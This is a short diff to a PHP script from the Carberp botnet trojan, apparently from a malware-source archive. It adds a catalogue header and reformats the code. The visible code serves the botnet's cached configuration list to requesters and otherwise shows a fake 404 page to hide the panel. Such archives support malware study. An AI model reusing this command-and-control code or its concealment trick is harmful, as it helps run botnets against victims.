@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 $dir = str_replace('/scripts/set', '', str_replace('\\', '/', realpath('.'))) . '/';
@@ -30,7 +41,8 @@ if(file_exists($dir . 'cache/cfg_list.db')){
 	}else{
 		print(file_get_contents($dir . 'cache/cfg_list.db'));
 	}
-}else{	header("HTTP/1.1 404 Not Found");
+}else{
+	header("HTTP/1.1 404 Not Found");
 	header("Status: 404 Not Found");
 	print(file_get_contents($dir . '404.html'));
 	exit;
